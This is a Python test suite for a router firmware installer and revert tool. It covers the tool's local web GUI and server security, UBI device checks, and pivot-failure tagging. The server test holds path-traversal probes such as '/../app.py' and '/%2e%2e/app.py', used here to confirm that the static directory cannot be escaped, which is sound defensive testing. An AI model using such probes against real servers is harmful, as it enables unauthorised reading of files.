    different = [(language, k) for language in strings for k in strings[language]
                 if placeholders(strings[language][k]) != placeholders(strings["en"].get(k, ""))]
    check("placeholders match across languages", not different, str(different[:5]))
    untranslated = [(language, k) for language in strings for k in strings[language]
                    if not strings[language][k].strip()]
    check("nothing is left blank", not untranslated, str(untranslated[:5]))

    used = set(re.findall(r'data-i18n(?:-placeholder)?="([^"]+)"', page))
    # Any dotted literal in the script: keys also travel through variables.
    used |= set(re.findall(r'"([a-z_0-9]+(?:\.[a-z_0-9]+)+)"', script)) - {"strings.json"}
    used |= {f"stage.{s}" for s in runner.STAGES}
    used |= {f"prereq.{c['id']}" for c in prereqs.collect()["checks"]}
    used |= {"prereq.paramiko", "prereq.passlib", "prereq.powershell"}
    used |= {f"prereq.platform.{p}" for p in ("linux", "wsl", "windows", "macos", "other")}
    for mode in ("install", "update", "revert"):
        used |= {f"config.lede.{mode}", f"review.action.{mode}", f"mode.{mode}.h"}
    used |= {"cancel.unsafe", "cancel.not_running"}     # `cancel.${code}` from the server
    missing = sorted(key for key in used if key not in strings["en"])
    check("every key the page uses exists", not missing, str(missing))
    unused = sorted(set(strings["en"]) - used)
    check("no key is left unused", not unused, str(unused))

    check("nothing is ever assigned as HTML", not re.search(
        r"\.(?:inner|outer)HTML\s*\+?=|insertAdjacentHTML|document\.write", script))
    check("the page has no inline script or style for the CSP to refuse",
          "<script>" not in page and "style=" not in page and "onclick=" not in page)
    check("secrets are password fields",
          all(f'id="{name}" type="password"' in page
              for name in ("wifi-key", "root-password", "current-password")))
    check("the false A/B claim on the revert card is gone",
          all("A/B" not in strings[language]["mode.revert.tag"] for language in strings))
    check("the typed confirmation differs from a stray keystroke in every language",
          all(len(strings[language]["confirm.word"]) > 3 for language in strings))


def test_gui_server():
    print("\n[gui: server]")
    import http.client
    _gui, app, _prereqs, runner = _gui_modules()
    server = app.Server(("127.0.0.1", 0), app.Handler)
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()

    def call(method, path, body=None, headers=None):
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=20)
        conn.putrequest(method, path, skip_accept_encoding=True)
        for name, value in (headers or {}).items():
            conn.putheader(name, value)
        data = json.dumps(body).encode() if body is not None else b""
        conn.putheader("Content-Length", str(len(data)))
        conn.endheaders(data)
        response = conn.getresponse()
        payload = response.read()
        conn.close()
        return response, payload

    def api(path):
        return f"{path}{'&' if '?' in path else '?'}t={app.TOKEN}"

    def wait_all_finished():
        deadline = time.time() + 15
        while time.time() < deadline:
            if all(r.finished for r in runner._RUNS.values()):
                return
            time.sleep(0.05)

    try:
        response, body = call("GET", "/?t=x")
        check("the page is served without a token", response.status == 200 and b"<html" in body)
        check("the page carries a CSP and no referrer",
              "default-src 'self'" in (response.getheader("Content-Security-Policy") or "")
              and response.getheader("Referrer-Policy") == "no-referrer")
        response, _ = call("GET", "/strings.json")
        check("translations are served as JSON", response.status == 200
              and "json" in response.getheader("Content-Type"))
        # Files that really exist out there, or the 404 would prove nothing.
        for path in ("/../app.py", "/%2e%2e/app.py", "/..%2fapp.py", "/..%5capp.py",
                     "/static/../../app.py", "/../../updater.py"):
            response, body = call("GET", path)
            check(f"no escape from the static directory: {path}",
                  response.status == 404 and b"import" not in body)

        response, _ = call("GET", "/api/prereqs")
        check("the API refuses a missing token", response.status == 403)
        response, _ = call("GET", "/api/prereqs?t=%D0%B9")
        check("a non-ASCII token is a refusal, not a crash", response.status == 403)
        response, body = call("GET", api("/api/prereqs"))
        check("the API answers with the token", response.status == 200
              and "platform" in json.loads(body))
        response, _ = call("POST", api("/api/run"), {"mode": "nonsense"})
        check("a bad request is a 400", response.status == 400)

        script = ("import sys, time\n"
                  "print('stdin is a tty:', sys.stdin.isatty(), flush=True)\n"
                  "print('=== stage 1: pre-flight ===', flush=True)\n"
                  "time.sleep(0.6)\n")
        with mock.patch.object(runner, "build_argv",
                               return_value=[sys.executable, "-c", script]):
            response, body = call("POST", api("/api/run"), {"mode": "install", "options": {}})
            run_id = json.loads(body).get("run_id")
            check("a run starts", response.status == 200 and bool(run_id))
            response, body = call("POST", api("/api/run"), {"mode": "install", "options": {}})
            check("a second run while one is active is refused",
                  response.status == 409 and json.loads(body).get("code") == "busy")
            wait_all_finished()
            response, body = call("GET", api(f"/api/stream/{run_id}"))
            events = [json.loads(line[6:]) for line in body.decode().splitlines()
                      if line.startswith("data: ")]
            ids = [line[4:] for line in body.decode().splitlines() if line.startswith("id: ")]
            logs = [e["line"] for e in events if e["type"] == "log"]
            check("a tool's output reaches the stream",
                  "stdin is a tty: False" in logs, str(logs))
            check("the stream ends with the outcome",
                  events and events[-1]["type"] == "done" and events[-1]["ok"] is True)
            check("the stage tracker is fed",
                  any(e["type"] == "stage" and e["stage"] == "preflight" for e in events))
            response, body = call("GET", api(f"/api/stream/{run_id}"),
                                  headers={"Last-Event-ID": ids[-2]})
            again = [json.loads(line[6:]) for line in body.decode().splitlines()
                     if line.startswith("data: ")]
            check("a reconnecting browser does not replay the log",
                  len(again) == 1 and again[0]["type"] == "done", str(len(again)))
            response, _ = call("POST", api("/api/run"), {"mode": "install", "options": {}})
            check("the next run may start once it finished", response.status == 200)
            wait_all_finished()
    finally:
        server.shutdown()
        server.server_close()
        wait_all_finished()
        runner._RUNS.clear()


def test_default_routes_fail_closed():
    """An unreadable route table must not read as "not your gateway"."""
    print("\n[host: default routes]")
    with mock.patch.object(install.subprocess, "run", side_effect=OSError("no ip")):
        try:
            install.default_routes()
            error = "no error"
        except install.Abort as exc:
            error = str(exc)
    check("an unreadable route table fails closed", "default routes" in error, error)

    failed = mock.Mock(returncode=2, stdout="", stderr="ip: bad")
    with mock.patch.object(install.subprocess, "run", return_value=failed):
        try:
            install.default_routes()
            error = "no error"
        except install.Abort as exc:
            error = str(exc)
    check("a failing ip command fails closed", "default routes" in error, error)

    empty = mock.Mock(returncode=0, stdout="", stderr="")
    with mock.patch.object(install.subprocess, "run", return_value=empty):
        check("a genuinely empty table is still no gateways",
              install.default_routes() == [], "")


def test_ubi9_reservation():
    """Every read-back must refuse a device 9 it does not own."""
    print("\n[ubi: device 9 is reserved toolchain-wide]")

    class FakeChannel:
        def __init__(self, map_reply):
            self.map_reply = map_reply
            self.commands = []

        def run(self, cmd, timeout=120, retries=2, quiet=False):
            self.commands.append(cmd)
            if cmd.startswith("for u in /sys/class/ubi"):
                return self.map_reply
            return 0, ""

    ch = FakeChannel((0, "ubi0 0\nubi9 5\n"))
    try:
        install.verify_written(ch, 9, "deadbeef", 4096)
        error = "no error"
    except install.Abort as exc:
        error = str(exc)
    check("the install read-back refuses a device 9 on another mtd",
          "attached to mtd5" in error, error)
    check("the install read-back detaches nothing before that check",
          not [c for c in ch.commands if c.startswith("ubidetach")],
          str(ch.commands))

    with mock.patch.object(restore, "ssh", return_value=(0, "ubi0 0\nubi9 7\n")):
        try:
            restore.require_own_ubi9("router.test", 9)
            error = "no error"
        except restore.RestoreError as exc:
            error = str(exc)
    check("the restore read-back refuses a device 9 on another mtd",
          "attached to mtd7" in error, error)

    for label, reply, wanted in (
            ("unreadable map", (1, "cat: /sys/class/ubi: No such file"),
             "cannot account for"),
            ("partial map", (0, "ubi0 0\nubi9\n"), "cannot account for"),
            ("live target", (0, "ubi0 9\n"), "already has ubi0 attached")):
        ch = FakeChannel(reply)
        try:
            install.verify_written(ch, 9, "deadbeef", 4096)
            error = "no error"
        except install.Abort as exc:
            error = str(exc)
        check(f"the install read-back fails closed on an {label}",
              wanted in error, error)

        with mock.patch.object(restore, "ssh", return_value=reply):
            try:
                restore.require_own_ubi9("router.test", 9)
                error = "no error"
            except restore.RestoreError as exc:
                error = str(exc)
        check(f"the restore read-back fails closed on an {label}",
              wanted in error, error)

    # do_restore runs from the RAM initramfs, where a successful, empty map is
    # the normal case: nothing has to be attached there. Treating it as
    # unreadable would abort every stock restore after the write.
    # The shape a real router returns: device dirs plus volume dirs, whose
    # mtd_num is empty. Before this was handled, every map on hardware looked
    # unreadable and the pivot refused a healthy box.
    real = "ubi0 19\nubi0_0 \nubi0_1 \nubi0_127 \n"
    ch = FakeChannel((0, real))
    try:
        install.require_own_ubi9(ch, 18)
        error = "no error"
    except install.Abort as exc:
        error = str(exc)
    check("volume directories in the map do not look like unreadable entries",
          error == "no error", error)

    with mock.patch.object(restore, "ssh", return_value=(0, real)):
        try:
            restore.require_own_ubi9("router.test", 18)
            error = "no error"
        except restore.RestoreError as exc:
            error = str(exc)
    check("the restore map parser ignores volume directories too",
          error == "no error", error)

    with mock.patch.object(restore, "ssh", return_value=(0, "")):
        try:
            restore.require_own_ubi9("router.test", 9)
            error = "no error"
        except restore.RestoreError as exc:
            error = str(exc)
    check("the restore read-back allows a clean empty map",
          error == "no error", error)

    with mock.patch.object(restore, "ssh", return_value=(0, "ubi0 0\n")):
        try:
            restore.require_own_ubi9("router.test", 9)
            error = "no error"
        except restore.RestoreError as exc:
            error = str(exc)
    check("a device 9 that is not attached at all is left alone",
          error == "no error", error)


def test_pivot_advice():
    """A tagged failure must become an instruction, not a bare message."""
    print("\n[revert: advice after a failed pivot]")
    import revert

    class Tagged(Exception):
        pass

    for stage, wanted in (("write-unconfirmed", "Do NOT reboot"),
                          ("rebooted", "Reach the RAM installer"),
                          ("not-written", None),
                          (None, None)):
        error = Tagged("boom")
        if stage:
            error.pivot_stage = stage
        advice = revert.pivot_advice(error)
        label = stage or "no tag"
        check(f"{label} gets {'advice' if wanted else 'no advice'}",
              (wanted in advice) if wanted else advice is None, str(advice))


def test_revert_pivot_guards():
    """The revert pivot must refuse what the A/B paths refuse, before erasing."""
    print("\n[revert: the pivot's preconditions]")
    import revert

    def pivot(mtd, ssh_reply=(0, "")):
        with tempfile.NamedTemporaryFile(suffix=".ubi") as image:
            image.write(b"x" * 4096)
            image.flush()
            with mock.patch.object(revert.restore, "mtd_map", return_value=mtd), \
                    mock.patch.object(revert.install, "ssh", return_value=ssh_reply):
                try:
                    revert.pivot_to_ram("router.test", image.name, "unused.itb", None)
                except revert.restore.RestoreError as exc:
                    return exc
        return None

    layout = {"ubi_kernel": {"index": 9, "size": 1024},
              "rootfs": {"index": 10, "size": 8192}}
    error = pivot(layout)
    # ubiformat erases PEBs as it writes, so this has to fail before the write,
    # not after it has already taken the installed kernel with it.
    check("an image too large for ubi_kernel is refused before ubiformat",
          "cannot fit" in str(error), str(error) or "no error")

    roomy = {"ubi_kernel": {"index": 9, "size": 8192},
             "rootfs": {"index": 10, "size": 8192}}
    error = pivot(roomy)
    check("the pivot fails closed when it cannot see the attached UBIs",
          "could not read" in str(error), str(error) or "no error")

    # ubi0 on mtd9 means a real UBI -- the running one -- sits on ubi_kernel.
    error = pivot(roomy, (0, "ubi0 9\n"))
    check("the pivot refuses ubi_kernel when a live UBI sits on it",
          "attached at runtime" in str(error), str(error) or "no error")

    # A dry run must not change kernel state at all: the interlock only reads,
    # and the detach happens after this gate.
    def dry(attached, state="status=done pid=1 active=0 lock=0"):
        commands = []

        def ssh(host, command, **kwargs):
            commands.append(command)
            if command.startswith("s=$(cat /tmp/pv.status"):
                return 0, state
            return 0, attached

        with tempfile.NamedTemporaryFile(suffix=".ubi") as image:
            image.write(b"x" * 4096)
            image.flush()
            with mock.patch.object(revert.restore, "mtd_map", return_value=roomy), \
                    mock.patch.object(revert.install, "ssh", side_effect=ssh), \
                    mock.patch.object(revert.install, "expected_volume",
                                      return_value=(b"x" * 10, "md5")):
                try:
                    result = revert.pivot_to_ram("router.test", image.name,
                                                 "unused.itb", None, dry_run=True)
                except revert.restore.RestoreError as exc:
                    return exc, commands
        return result, commands

    result, commands = dry("ubi0 10\n")
    check("a dry run stops before the write",
          result is None and not [c for c in commands if c.startswith("ubidetach")],
          str(commands))

    result, commands = dry("ubi0 10\nubi9 9\n")
    check("a dry run does not detach even a stale read-back device",
          result is None and not [c for c in commands if c.startswith("ubidetach")],
          str(commands))

    # "It was not busy" proves nothing: a live device 9 with no open reference
    # detaches just as cleanly, so only a prior pivot makes device 9 ours.
    result, commands = dry("ubi0 10\nubi9 9\n", state="status= pid= active=0 lock=0")
    check("device 9 on ubi_kernel is refused when no pivot ran here",
          isinstance(result, revert.restore.RestoreError)
          and "no record of a pivot" in str(result)
          and "ubidetach -d 9" in str(result), str(result))

    result, commands = dry("nonsense line\n")
    check("the pivot fails closed on an unreadable attached-UBI map",
          isinstance(result, revert.restore.RestoreError)
          and "refusing to pick a target" in str(result), str(result))

    result, commands = dry("ubi0 10\nubi9 5\n")
    check("a device 9 attached to another mtd is never detached",
          isinstance(result, revert.restore.RestoreError)
          and "attached to mtd5" in str(result), str(result))

    # Every one of those refusals happened before anything was erased, and
    # updater picks its advice from this tag: a wrong tag would tell the
    # operator that nothing bootable is left when the box is perfectly intact.
    check("a refusal before the write is tagged not-written",
          all(getattr(e, "pivot_stage", None) == "not-written"
              for e in (pivot(layout), pivot(roomy), pivot(roomy, (0, "ubi0 9\n")))),
          "missing or wrong pivot_stage")


def test_kernel_volume_id():
    """The read-back must find the kernel volume by name, not by position."""
    print("\n[revert: reading the kernel volume back]")
    import revert

    multi = ("Volume ID:   0 (on ubi9)\n"
             "Type:          dynamic\n"
             "Name:          rootfs\n"
             "Volume ID:   1 (on ubi9)\n"
             "Type:          dynamic\n"
             "Name:          kernel\n"
             "Volume ID:   2 (on ubi9)\n"
             "Name:          rootfs_data\n")
    check("the kernel volume is found by name, not by position",
          revert.kernel_volume_id(multi) == "1", revert.kernel_volume_id(multi))
    check("a volume named rootfs is not taken for the kernel",
          revert.kernel_volume_id("Volume ID:   0 (on ubi9)\nName: rootfs\n") is None)


def test_read_back_kernel():
    """The read-back attaches, reads the named volume, and always detaches."""
    print("\n[revert: the read-back]")
    import revert
    volumes = ("Volume ID:   0 (on ubi9)\nName:          rootfs\n"
               "Volume ID:   1 (on ubi9)\nName:          kernel\n")

    def fake(md5_line):
        calls = []

        def ssh(host, command, **kwargs):
            calls.append(command)
            if command.startswith("ubiattach"):
                return 0, ""
            if command.startswith("ubinfo"):
                return 0, volumes
            if command.startswith("md5sum /dev/ubi9_"):
                return 0, md5_line + "\n4096"
            return 0, ""
        return ssh, calls

    ssh, calls = fake("abc123  4096")
    with mock.patch.object(revert.install, "ssh", side_effect=ssh):
        dev = revert.read_back_kernel("router.test", 9, "abc123")
    check("the read-back reads the kernel volume, not volume 0",
          dev == "/dev/ubi9_1", dev)
    check("the read-back detaches device 9 again on the way out",
          sum(1 for c in calls if c.startswith("ubidetach")) == 2, str(calls))

    ssh, calls = fake("deadbeef  4096")
    with mock.patch.object(revert.install, "ssh", side_effect=ssh):
        try:
            revert.read_back_kernel("router.test", 9, "abc123")
            error = "no error"
        except revert.restore.RestoreError as exc:
            error = str(exc)
    check("a mismatched read-back refuses loudly without rebooting",
          "Do NOT reboot" in error, error)
    check("a mismatched read-back still detaches device 9",
          sum(1 for c in calls if c.startswith("ubidetach")) == 2, str(calls))


def test_pivot_stage_tagging():
    """The stage tag is what updater turns into advice; test its producer.

    Since updater picks "do not reboot, retry" vs "reach the RAM installer"
    from `pivot_stage`, a wrong tag is a wrong instruction on the one path with
    no fallback.
    """
    print("\n[revert: tagging how far the pivot got]")
    import revert

    roomy = {"ubi_kernel": {"index": 9, "size": 8192},
             "rootfs": {"index": 10, "size": 8192}}

    def scripted(*, job_state="status= pid= active=0 lock=0", poll="fail:1",
                 md5=None, discover=None, launch="rc=0"):
        def ssh(host, command, **kwargs):
            if command.startswith("for u in /sys/class/ubi/ubi"):
                return 0, "ubi0 10\n"
            if command.startswith("s=$(cat /tmp/pv.status"):
                return 0, job_state
            if command.startswith("md5sum /tmp/ini.ubi"):
                return 0, md5 + "  /tmp/ini.ubi"
            if command.startswith("start-stop-daemon -S -b -x /tmp/pv.sh"):
                return 0, launch
            if command.startswith("cat /tmp/pv.status"):
                return 0, poll
            if command.startswith("tail -20 /tmp/pv.log"):
                return 0, "ubiformat: error!"
            if command.startswith("ubinfo"):
                return 0, "Volume ID:   1 (on ubi9)\nName:          kernel\n"
            if command.startswith("md5sum /dev/ubi9_"):
                return 0, md5 + "\n4096"
            return 0, ""
        return ssh

    def run(iface=None, **kwargs):
        with tempfile.NamedTemporaryFile(suffix=".ubi") as image:
            image.write(b"x" * 4096)
            image.flush()
            md5 = hashlib.md5(b"x" * 4096).hexdigest()
            ssh = scripted(md5=md5, **kwargs)
            patches = [
                mock.patch.object(revert.restore, "mtd_map", return_value=roomy),
                mock.patch.object(revert.install, "ssh", side_effect=ssh),
                mock.patch.object(revert.install, "scp_to", return_value=None),
                mock.patch.object(revert.install, "expected_volume",
                                  return_value=(b"x" * 4096, md5)),
                mock.patch.object(revert.time, "sleep", return_value=None),
            ]
            if kwargs.get("discover") is not None:
                patches.append(mock.patch.object(
                    revert.install, "wait_and_discover",
                    side_effect=kwargs["discover"]))
            for patch in patches:
                patch.start()
            try:
                revert.pivot_to_ram("router.test", image.name, "unused.itb", iface)
            except Exception as exc:                       # noqa: BLE001 - the point
                return exc
            finally:
                for patch in reversed(patches):
                    patch.stop()
        return None

    error = run(job_state="status=fail:1 pid= active=0 lock=1")
    check("a failed prior pivot is tagged as an unconfirmed write",
          getattr(error, "pivot_stage", None) == "write-unconfirmed",
          getattr(error, "pivot_stage", "missing"))

    # The pivot script's EXIT trap removes the lock on a normal failed exit, so
    # this -- not the lock=1 variant above -- is the state real hardware leaves
    # behind. It also isolates the "any status means a write was issued" term.
    error = run(launch="start-stop-daemon: not found")
    check("a launcher that refuses outright is not called a write",
          getattr(error, "pivot_stage", None) == "not-written",
          f"{getattr(error, 'pivot_stage', 'missing')}: {error}")

    error = run(job_state="status=fail:1 pid=1234 active=0 lock=0")
    check("a failed pivot that cleaned its lock up is still an unconfirmed write",
          getattr(error, "pivot_stage", None) == "write-unconfirmed",
          getattr(error, "pivot_stage", "missing"))

    error = run()
    check("a write that dies mid-flight is tagged write-unconfirmed",
          getattr(error, "pivot_stage", None) == "write-unconfirmed",
          f"{getattr(error, 'pivot_stage', 'missing')}: {error}")

    error = run(iface="eth0", poll="done",
                discover=revert.install.Abort("nothing appeared on eth0"))
    check("a failure after the write verified is tagged rebooted",
          getattr(error, "pivot_stage", None) == "rebooted",
          f"{getattr(error, 'pivot_stage', 'missing')}: {error}")


def main():
    t0 = time.time()
    test_profiles()
    test_simple_installer_cli()
    test_firstboot_configuration()
    test_restore_guards()
    test_resume_manifest_and_flash_guards()
    test_rediscovery()
    test_router_gateway()
    test_atomic_writer_scripts()
    test_stager()
    test_ubi()
    test_ubi_live_hazards()
    test_readback_match()
    test_real_artifact()
    test_parsers()
    test_protocol()
    test_http_flow()
    test_facts_commands()
    test_pull_fallback()
    test_installer_preflight()
    test_v17_names()
    test_v2_names()
    test_v17_nand_support()
    test_release_selection()
    test_release_entrypoints()
    test_release_integrity()
    test_tagged_revert_cache()
    test_stock_image()
    test_expected_volume()
    test_install_failure_hint()
    test_updater()
    test_default_routes_fail_closed()
    test_ubi9_reservation()
    test_pivot_advice()
    test_revert_pivot_guards()
    test_kernel_volume_id()
    test_read_back_kernel()
    test_pivot_stage_tagging()
    test_gui_runner()
    test_gui_strings()
    test_gui_server()
    test_channel()
    print(f"\n{len(PASS)} passed, {len(FAIL)} failed, {len(SKIP)} skipped "
          f"in {time.time() - t0:.1f}s")
    if FAIL:
        print("failed: " + ", ".join(FAIL))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
